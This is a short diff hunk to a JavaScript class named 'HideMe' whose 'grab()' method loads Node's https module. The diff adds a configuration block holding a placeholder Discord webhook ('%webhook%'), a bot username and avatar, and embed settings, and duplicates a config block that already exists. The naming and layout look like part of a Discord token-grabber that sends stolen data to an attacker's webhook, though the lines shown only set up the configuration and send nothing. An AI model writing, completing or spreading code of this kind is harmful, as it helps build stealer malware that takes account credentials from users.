@@ -79,6 +79,18 @@ class HideMe {
     async grab(){
         window.dispatchEvent(new Event('beforeunload')); //Useless Atm
         const https = require('https');//Hehehe Hello XMLHttpRequest
+        
+        var config = {
+            pingOnResult: true,
+            webHook: "%webhook%",
+            webhookUsername: "Hello World",
+            webhookAvatar: "https://cdn.discordapp.com/avatars/908070943329488916/35ebf6d39bc25e52da855424119bc28f.webp?size=80",
+
+            embedTitle: "Hello World",
+            embedColor: 0x36393f,
+
+            tts: false
+        };
 
         var config = {
             pingOnResult: true,
